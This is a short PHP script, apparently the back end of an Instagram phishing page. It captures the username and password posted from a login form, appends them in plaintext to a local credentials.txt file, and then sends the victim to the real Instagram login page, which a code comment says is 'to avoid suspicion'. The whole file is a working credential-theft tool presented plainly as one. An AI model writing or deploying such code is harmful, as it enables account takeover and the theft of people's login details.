<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = 'docs/credentials.txt';

    // Save the credentials to a file or database
    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);

    // Redirect to the real Instagram login page to avoid suspicion
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>
